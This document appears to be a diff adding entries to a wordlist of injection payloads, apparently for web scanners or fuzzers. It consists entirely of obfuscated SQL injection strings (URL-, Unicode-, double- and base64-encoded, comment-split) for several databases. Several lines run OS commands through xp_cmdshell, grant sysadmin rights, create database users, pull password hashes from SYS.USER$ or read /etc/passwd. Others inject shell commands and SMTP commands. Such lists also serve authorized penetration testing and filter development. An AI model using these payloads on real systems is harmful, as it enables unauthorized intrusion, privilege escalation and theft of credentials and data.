+uname%23SxtrJZlBkVV%0A-n%23roWbpYXu%0A-s
+' oR UsEr LIkE '%
+'/*!create*//*!user*/name identified/*!by*/pass123/*!temporary*/tablespace temp/*!default*/tablespace users;
+),NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20-- and '0having'='0having'
+))))+and+0=benchmark(3000000,MD5(1))%20--
+"))) and 0 LIKE benchmark(3000000,MD5(1))%20%23
+'/*!AND*/1=utl_inaddr.get_host_address((/*!SELECT*/DISTINCT(table_name)/*!FROM*/(/*!SELECT*/DISTINCT(table_name), ROWNUM/*!AS*//*!LIMIT*//*!FROM*/sys.all_tables)/*!WHERE*//*!LIMIT*/=7))/*!AND*/'i'='i
+%u0022%u0029%u003B%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u005F%u005F%u0054%u0049%u004D%u0045%u005F%u005F%u0027%u002D%u002D
+%2527%2520%2541%254E%2544%2520%2531%253D%2575%2574%256C%255F%2569%256E%2561%2564%2564%2572%252E%2567%2565%2574%255F%2568%256F%2573%2574%255F%2561%2564%2564%2572%2565%2573%2573%2528%2528%2553%2545%254C%2545%2543%2554%2520%2544%2549%2553%2554%2549%254E%2543%2554%2528%2555%2553%2545%2552%254E%2541%254D%2545%2529%2520%2546%2552%254F%254D%2520%2528%2553%2545%254C%2545%2543%2554%2520%2544%2549%2553%2554%2549%254E%2543%2554%2528%2555%2553%2545%2552%254E%2541%254D%2545%2529%252C%2520%2552%254F%2557%254E%2555%254D%2520%2541%2553%2520%254C%2549%254D%2549%2554%2520%2546%2552%254F%254D%2520%2553%2559%2553%252E%2541%254C%254C%255F%2555%2553%2545%2552%2553%2529%2520%2557%2548%2545%2552%2545%2520%254C%2549%254D%2549%2554%253D%2531%2529%2529%2520%2541%254E%2544%2520%2527%2569%2527%253D%2527%2569
+"+/*!0if(benchmark(3000000,MD5(1)),/*!0NULL,/*!0NULL),/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL)%20%23
+%; %i%d
+' AND 1=utl_inaddr.get_host_address((SELECT DISTINCT(granted_role) FROM (SELECT DISTINCT(granted_role), ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE=SYS.LOGINUSER) WHERE LIMIT=6)) AND 'i'='i
+23 OR%091 LIKE 1
+exec+master..xp_cmdshell+'ipconfig+/all'
+'%23%0Aor%23%0A'W'='W'%23%0A#
+'; exec xp_regread-- sp_password
+,NULL,NULL,NULL)%20waitfor%20delay%20%EF%BC%870:0:20%EF%BC%87%20--
+%79%20%6F%72%20%31%3D%31%20%2D%2D
+'/*!or*/4479/*
+' aNd 1=utl_inaddr.get_host_address((SeLEct diStINCt(USERNAME) FroM (SeLEct diStINCt(USERNAME), ROWNUM As lImiT FroM SYS.ALL_USERS) WHErE lImiT=3)) aNd 'i'='i
+y /*!30195' or 3=3*/
+a' or 3=3--%00
+' group by userid having 1=1-- and '0having'='0having'
+"+if(benchmark(3000000,MD5(1)),NULL,NULL))%20%23 and '0having'='0having'
+9999'||(select like('abcdefg',upper(hex(randomblob(150000000)))))||'9999 and '0having'='0having'
+)))+waitfor+delay+'0:0:20'+/*
+%2529%252C%2528%2573%2565%256C%2565%2563%2574%2520%2569%2566%2528%2563%256F%2575%256E%2574%2528%252A%2529%2521%253D%252D%2531%252C%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%252C%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%2529%2529%2523
+JyUyMG9yJTIwMT0x
+))%05and%050=benchmark(3000000,MD5(1))%20/*
+)))) and 0 BETWEEN benchmark AND benchmark(3000000,MD5(1))%20/*
+0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A%00
+%2573%2565%256C%2565%2563%2574%2520%2563%2575%2572%2572%2565%256E%2574%255F%2575%2573%2565%2572%253B
+declare%C0%AA%C0%CAs%C0%AAvarchar%C0%AA200%C0%AB%C0%AAselect%C0%AA%C0%CAs%C0%AA%C0%BF%C0%AA0x77616974666F722064656C61792027303A303A31302700%C0%AAexec%C0%AA%C0%CAs%C0%AB
+%27%20%75%6E%69%6F%6E%20%28%73%65%6C%65%63%74%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%4E%55%4C%4C%2C%20%20%28%73%65%6C%65%63%74%20%40%40%76%65%72%73%69%6F%6E%29%29%20%2D%2D
+'))))%23aOTIvS%0Aand%23FRxbKkMTYvM%0A%23NhoFKjw%0A0=benchmark(3000000,MD5(1))%20--
+a'+or+3=3--
+'/**/AND/**/1=utl_inaddr.get_host_address((SELECT/**/DISTINCT(granted_role)/**/FROM/**/(SELECT/**/DISTINCT(granted_role),/**/ROWNUM/**/AS/**/LIMIT/**/FROM/**/dba_role_privs/**/WHERE/**/GRANTEE=SYS.LOGINUSER)/**/WHERE/**/LIMIT=1))/**/AND/**/'i'='i
+%u0027%u003B%u0020%u0069%u0066%u0020%u006E%u006F%u0074%u0028%u0073%u0075%u0062%u0073%u0074%u0072%u0069%u006E%u0067%u0028%u0028%u0073%u0065%u006C%u0065%u0063%u0074%u0020%u0040%u0040%u0076%u0065%u0072%u0073%u0069%u006F%u006E%u0029%u002C%u0032%u0035%u002C%u0031%u0029%u0020%u003C%u003E%u0020%u0038%u0029%u0020%u0077%u0061%u0069%u0074%u0066%u006F%u0072%u0020%u0064%u0065%u006C%u0061%u0079%u0020%u0027%u0030%u003A%u0030%u003A%u0032%u0027%u0020%u002D%u002D
+))))%23%0Awaitfor%23%0Adelay%23%0A'0:0:20'%23%0A/*
+y'%23tZQEnxrM%0Aor%23QmggCTadK%0A1=1%23bbmfcEZQxF%0Aor%23ZmHNpO%0A'y'='y
+%u0027%u0020%u006F%u0072%u0020%u0073%u006C%u0065%u0065%u0070%u0028%u005F%u005F%u0054%u0049%u004D%u0045%u005F%u005F%u0029%u003D%u0027
+%EF%BC%87; if not(substring((select @@version),25,1) <> 8) waitfor delay %EF%BC%870:0:2%EF%BC%87 --
+JykpIHdhaXRmb3IgZGVsYXkgJzA6MDoyMCcgLS0=
+'/*!0exec sp_addsrvrolemember 'name' , 'sysadmin' --
+' /*!00000or ''qwer''=''qwer'' or ''='*/
+declare @q nvarchar (200) 0x730065006c00650063007400200040004000760065007200730069006f006e00   exec(@q)
+%28%73%65%6C%65%63%74%20%63%6F%75%6E%74%28%2A%29%20%66%72%6F%6D%20%73%79%73%69%62%6D%2E%73%79%73%74%61%62%6C%65%73%20%61%73%20%74%31%2C%73%79%73%69%62%6D%2E%73%79%73%74%61%62%6C%65%73%20%61%73%20%74%32%2C%73%79%73%69%62%6D%2E%73%79%73%74%61%62%6C%65%73%20%61%73%20%74%33%29
+exec master..xp_cmdshell 'net+view' and '0having'='0having'
+',null,null,null)%20waitfor%20delay%20'0:0:20'%20--
+uni/**/on%01sel/**/ect
+,NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20---- sp_password
+1))+or+pg_sleep(__TIME__)--
+%0aDATA%0afoo%0a%2e%0aMAIL+/*!FROM*/:+<youremail>%0aRCPT+/*!TO*/:+<youremail>%0aDATA%0aFrom:+<youremail>%0aTo:+<youremail>%0aSubject:+tst%0afoo%0a%2e%0a
+'%23mNNLKl%0Aexec%23cUCMvBzzfy%0A%23vEHMxmYzK%0Asp_addsrvrolemember%23tveOOIqPVxTI%0A'name'%23yTjAPOukdno%0A,%23GpBraoW%0A'sysadmin'%23gpAuYH%0A--
+'%23JrCueeWC%0AAND%23bDZoLzkL%0A1=utl_inaddr.get_host_address((SELECT%23NSnYvPpvS%0ADISTINCT(PASSWORD)%23StyDaiwgfs%0AFROM%23XoCvpbyTocR%0A(SELECT%23isyJZyyNNt%0ADISTINCT(PASSWORD),%23eDOyzjGqX%0AROWNUM%23FMATCNn%0AAS%23gaDfJOw%0ALIMIT%23ubGikfYN%0AFROM%23SqXqBGk%0ASYS.USER$)%23PahrCa%0AWHERE%23XapYjcVZq%0ALIMIT=6))%23WunxMSVJb%0AAND%23AazSKQyfzGVK%0A'i'='i
+|| ping -i 30 127.0.0.1 ; x || ping -n 30 127.0.0.1 & and '0having'='0having'
+select+current_setting('config_file');
+' or 2 between 2 and 5 and '0having'='0having'
+or /*!000001=1*/--
+' /*!00000and 0=benchmark(3000000,MD5(1))%20%23*/
+%EF%BC%87))) and 0=benchmark(3000000,MD5(1))%20%23
+'))) /*!30171or 1=1 or ((('1'='1*/
+%C0%AF%C0%AF%C0%AA
+%<%f%o%o%>%<%/%f%o%o%>
+'+or+a=a--
+'),NULL)%20waitfor%20delay%20'0:0:20'%20---- sp_password
+y' AND userid IS NULL; --
+'   create     user  name identified    by  pass123   temporary   tablespace temp   default  tablespace users;
+%u0073%u0065%u006C%u0065%u0063%u0074
+")%0Aor%0Dsleep(__TIME__)="
+x'%23XJJhUX%0AAND%23bGJdEbEpyv%0A%23uyurNKxrl%0Amembers.email%23IxfymUO%0AIS%23VFQHpdtv%0A%23QiSZUzhGpkYe%0ANULL%23Nqkbmg%0A;%23ByicttKMTRVt%0A--
+y--%0A'--%0Aor--%0A2--%0Abetween--%0A1--%0Aand--%0A3
+declare+@q+nvarchar+(200)+0x730065006c00650063007400200040004000760065007200730069006f006e00+exec(@q)
+%2527%252B%2569%2566%2528%2562%2565%256E%2563%2568%256D%2561%2572%256B%2528%2533%2530%2530%2530%2530%2530%2530%252C%254D%2544%2535%2528%2531%2529%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%2520%2523
+%27%2B%69%66%28%62%65%6E%63%68%6D%61%72%6B%28%33%30%30%30%30%30%30%2C%4D%44%35%28%31%29%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%2F%2A
+' /*!30810or (EXISTS)*/
+& and '0having'='0having'
+'),  NULL  ,  NULL  ,  NULL  ,  NULL  ,  NULL  )%20waitfor%20delay%20'0:0:20'%20/*
+'1'OR'1∩ and '0having'='0having'
+0x77616974666F722064656C61792027303A303A31302700+exec(@s)
+'/*!union*/+/*!select*/+/*!user*/,/*!null*/,/*!null*/,/*!null*/,/*!null*/+/*!from*/+/*!dual*/每
+#/*!0from wapiti
+),NUL/**/L,NUL/**/L)%20waitfor%20delay%20'0:0:20'%20--
+"))))%09and%0A0=benchmark(3000000,MD5(1))%20--
+%27%2F%2A%2A%2F%6F%72%2F%2A%2A%2F%34%34%37%39%2F%2A%2A%2F%3D%2F%2A%2A%2F%34%34%37%39
+%9%9%9%9%"%|%|%(%s%e%l%e%c%t %c%o%u%n%t%(%*%) %f%r%o%m %a%l%l%_%u%s%e%r%s %t%1%,%a%l%l%_%u%s%e%r%s %t%2%,%a%l%l%_%u%s%e%r%s %t%3%,%a%l%l%_%u%s%e%r%s %t%4%,%a%l%l%_%u%s%e%r%s %t%5%)%|%|%"%9%9%9%9
+1;select%20*
+eCcgT1IgZnVsbF9uYW1lIExJS0UgJyVCb2Il
+)%20waitfor%20delay%20'0:0:20'%20-- and '0having'='0having'
+%"%,%N%U%L%L%,%N%U%L%L%,%N%U%L%L%)%20%w%a%i%t%f%o%r%20%d%e%l%a%y%20%'%0%:%0%:%2%0%'%20%-%-
+)))%0Cand%0A0=benchmark(3000000,MD5(1))%20/*
+select current_setting('log_statement'); and '0having'='0having'
+x'--%0Aor--%0Aname()='username'--%0Aor--%0A'x'='y
+declare /*!00000@q nvarchar (200) select @q = 0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec(@q)*/
+'+if(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/),/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20/*
+)))%07waitfor%09delay%02'0:0:20'%05--
+%27%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2D%2D
+2%C0%ABunion%C0%AB%C0%AAselect%C0%ABload%C0%DFfile%C0%AA%C0%AF%C0%AFetc%C0%AFpasswd%C0%AF%C0%AB%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%AEnull%C0%ABfrom%C0%ABdual%C0%AB
+' /*!30329and 1 in (select var from temp)*/--
+%27%20%6F%72%20%27%27%71%77%65%72%27%27%3D%27%27%71%77%65%72%27%27%20%2F%2A
+"))%23%0Aand%23%0A0=benchmark(3000000,MD5(1))%20%23
+y '/*!0or 3 > 1
+' or 'a'='a and '0having'='0having'
+")))%23ssJNIG%0Aand%23DMjCaATkBjQ%0A%23WxxFNuwkb%0A0=benchmark(3000000,MD5(1))%20--
+'; /*!30912execute immediate 'sel' || 'ect us' || 'er'*/
+9999" or benchmark(15000000,md5(0x4e446b6e)) or "0" LIKE "9999
+' oR ''qwer''=''qwer''--
+a'%23XmxxKDUu%0Aor%23gMNnMu%0A%23fXGcRn%0A3=3--
+"))))/*!0and 0=benchmark(3000000,MD5(1))%20%23
+%2527%2520%256F%2572%2520%2527%2574%2565%2578%2574%2527%2520%253E%2520%2527%2574%2527
+hi or 1 BETWEEN 1 AND 1--"
+")))    and  0=benchmark(3000000,MD5(1))%20%23
+' union select 1,2,3,x,x,x,x,@@version,x每
+<>"%bf%27%;)(&+
+1%23iJfEuo%0Aor%23WAwZSWQznL%0A(select%23JyKYalu%0Acount(*)%23xMomlJXm%0Afrom%23DviJYakOpka%0AINFORMATION_SCHEMA.tables%23AWilxTDk%0Aas%23KjHOYpGR%0Asys1,INFORMATION_SCHEMA.tables%23IGJVNzWO%0Aas%23prjzOaqUG%0Asys2,INFORMATION_SCHEMA.tables%23ODlXOLj%0Aas%23GstVzI%0Asys3,INFORMATION_SCHEMA.tables%23gyyKRtJT%0Aas%23mksqlJWZOts%0Asys4,INFORMATION_SCHEMA.tables%23IzkRgeNP%0Aas%23GtYsxRH%0Asys5,INFORMATION_SCHEMA.tables%23XpQLJTFV%0Aas%23EbaCeZB%0Asys6)=0%23YsgMmYahA%0Aor%23kXeNdDro%0A1=1
+999999 or 1=1 or 1=1%00
+,N/**/ULL)%20waitfor%20delay%20'0:0:20'%20--
+\n/usr/bin/id| and '0having'='0having'
+"+if(benchmark(3000000,MD5(1)),/*!NULL*/,/*!NULL*/))%20/*
+%2A%7C and '0having'='0having'
+create table myfile (input TEXT); load data infile '<filepath>' into table myfile; select * from myfile;
+o/**/r
+' A/**/ND 1=utl_inaddr.get_host_address((S/**/E/**/LECT C/**/O/**/U/**/NT(DIS/**/TI/**/N/**/CT(table_name)) F/**/ROM sys.all_tables)) A/**/ND 'i'='i
+%\%n%/%u%s%r%/%b%i%n%/%i%d%\%n
+%' %o%r %0%=%0 %#
+%C0%AE%C0%AAid
+exec%C0%AAxp
+'--CPmwXuKnj%0AUNION--LhJdmbevZvbH%0ASELECT
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0)); and '0having'='0having'
+"),NULL,NULL,NULL,NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20-- and '0having'='0having'
+"+/*!0if(benchmark(3000000,MD5(1)),/*!0NULL,/*!0NULL),/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL,/*!0NULL)%20--
+')) and 0=benchmark(3000000,MD5(1))%20/*-- sp_password
++if(benchmark(3000000,MD5(1)),NULL%09,NULL%09),NULL%09,NULL%09,NULL%09)%20--
+%C0%AFOR%C0%AA%C0%AF%C0%AF%C0%AA%C0%BF%C0%AA%C0%AF%C0%8BAllows%C0%AAauthentication%C0%AAwithout%C0%AAa%C0%AAvalid%C0%AAusername%C0%AE
+'/*!or*/pg_sleep(__TIME__)--
+',N/**/U/**/LL,N/**/U/**/LL,N/**/U/**/LL,N/**/U/**/LL,N/**/U/**/LL,N/**/U/**/LL,N/**/U/**/LL,N/**/U/**/LL)%20waitfor%20delay%20'0:0:20'%20/*
+',N/**/ULL,N/**/ULL,N/**/ULL,N/**/ULL,N/**/ULL,N/**/ULL)%20waitfor%20delay%20'0:0:20'%20--
+'),NULL,NULL,NULL)%20waitfor%20delay%20'0:0:20'%20/*
+(select%0E99999999%0Cfrom%0Fpg_sleep(15))%0Eas%0Btest
+echo%23BCXlewanC%0A111111
+%u002B%u0069%u0066%u0028%u0062%u0065%u006E%u0063%u0068%u006D%u0061%u0072%u006B%u0028%u0033%u0030%u0030%u0030%u0030%u0030%u0030%u002C%u004D%u0044%u0035%u0028%u0031%u0029%u0029%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u0029%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u002C%u004E%u0055%u004C%u004C%u0029%u0020%u002D%u002D
+JyksTlVMTCxOVUxMLE5VTEwpJTIwd2FpdGZvciUyMGRlbGF5JTIwJzA6MDoyMCclMjAtLQ==
+Iikgb3Igc2xlZXAoX19USU1FX18pPSI=
+1%23UmBbdl%0Aor%23QNznrgSTTog%0A%23SaVOEXfSMhz%0A1=1--
+'))) and 0 BETWEEN benchmark AND benchmark(3000000,MD5(1))%20%23
+1%23YeMoLf%0Aor%23eSDoob%0A1%23MhZEiqYxyBI%0Ain%23NwMzeTwb%0A(@@version)--
+'%23xjMnGHCCgn%0Aor%23alprcUj%0A%23KZiHirugBlpA%0A(EXISTS%23oxzghi%0A)
+%2520%256F%2572%2520%2578%253D%2578
+%2527%2520%2541%254E%2544%2520%2531%253D%2575%2574%256C%255F%2569%256E%2561%2564%2564%2572%252E%2567%2565%2574%255F%2568%256F%2573%2574%255F%2561%2564%2564%2572%2565%2573%2573%2528%2528%2553%2545%254C%2545%2543%2554%2520%2544%2549%2553%2554%2549%254E%2543%2554%2528%2574%2561%2562%256C%2565%255F%256E%2561%256D%2565%2529%2520%2546%2552%254F%254D%2520%2528%2553%2545%254C%2545%2543%2554%2520%2544%2549%2553%2554%2549%254E%2543%2554%2528%2574%2561%2562%256C%2565%255F%256E%2561%256D%2565%2529%252C%2520%2552%254F%2557%254E%2555%254D%2520%2541%2553%2520%254C%2549%254D%2549%2554%2520%2546%2552%254F%254D%2520%2573%2579%2573%252E%2561%256C%256C%255F%2574%2561%2562%256C%2565%2573%2529%2520%2557%2548%2545%2552%2545%2520%254C%2549%254D%2549%2554%253D%2536%2529%2529%2520%2541%254E%2544%2520%2527%2569%2527%253D%2527%2569
+'%23vCsYnJI%0Aunion%23mhnCIDlKc%0A(select%23YMMLBCFaKl%0A@@version)%23LLgpBo%0A--
+x' or name()='username' or 'x'='y-- sp_password
+y'--%0AAND--%0Aemail--%0AIS--%0ANULL;--%0A--
+9999'+(select+count(*)+from+sysusers+as+sys1,sysusers+as+sys2,sysusers+as+sys3,sysusers+as+sys4,sysusers+as+sys5,sysusers+as+sys6,sysusers+as+sys7)+'9999
+exec(@s) and '0having'='0having'
+%bf%27)) or 1=1--
+1%20and%20--%0A1=1
+%27%20%6F%72%20%27%57%27%3D%27%57%27%20%2D%2D
+%2527%2529%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%252C%254E%2555%254C%254C%2529%2520%2577%2561%2569%2574%2566%256F%2572%2520%2564%2565%256C%2561%2579%2520%2527%2530%253A%2530%253A%2532%2530%2527%2520%252F%252A
+,/*!NULL*/,/*!NULL*/,/*!NULL*/,/*!NULL*/)%20waitfor%20delay%20'0:0:20'%20/*
+IiksTlVMTCxOVUxMKSUyMHdhaXRmb3IlMjBkZWxheSUyMCcwOjA6MjAnJTIwLS0=
+%C0%AA%C0%AB%C0%AAand%C0%AA0%C0%BFbenchmark%C0%AA3000000%C0%AEMD5%C0%AA1%C0%AB%C0%AB%20%C0%AF%C0%AF
+'+iF(benchmark(3000000,MD5(1)),nUll,nUll),nUll,nUll,nUll,nUll,nUll)%20/*
+'/*!0AND 1=utl_inaddr.get_host_address((/*!0SELECT/*!0DISTINCT(table_name)/*!0FROM (/*!0SELECT/*!0DISTINCT(table_name), ROWNUM/*!0AS/*!0LIMIT/*!0FROM sys.all_tables)/*!0WHERE/*!0LIMIT=8))/*!0AND 'i'='i
+exec%09sp
+y %bf%27 or 5 > 6
+%27%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%2C%4E%55%4C%4C%29%20%77%61%69%74%66%6F%72%20%64%65%6C%61%79%20%27%30%3A%30%3A%32%30%27%20%2F%2A
+response.write--%0A111111
+9999"||(/*!0select/*!0like('abcdefg',/*!0upper(hex(randomblob(150000000)))))||"9999
+%0Acat%20/etc/passwd-- sp_password
+x'%09or%051=1%0Eor%07'x'='y
+or%0Da%0D=%0Ca
+%$%+%|%+%D%i%r%+%c%:%2f
+' /*!30590or 'W'='W' */--
++if%23kxygelvUp%0A(benchmark(3000000,MD5(1)),NULL%23vMYqGAZ%0A,NULL%23QzKaEinPqlQ%0A),NULL%23HdzlDW%0A,NULL%23yCMXZIibG%0A,NULL%23rsCuCavM%0A)%20/*
+'%0Cor%09''qwer''%0Ain%0C(select%0A@@version)--
+"))%20waitfor%20delay%20'0:0:20'%20--%00
+%2527%2520%256F%2572%2520%2527%2527%2571%2577%2565%2572%2527%2527%2520%2569%256E%2520%2528%2573%2565%256C%2565%2563%2574%2520%2540%2540%2576%2565%2572%2573%2569%256F%256E%2529%252D%252D
+%;%s%y%s%t%e%m%(%'%c%a%t%20%/%e%t%c%/%p%a%s%s%w%d%'%)
+uname -n -s%00
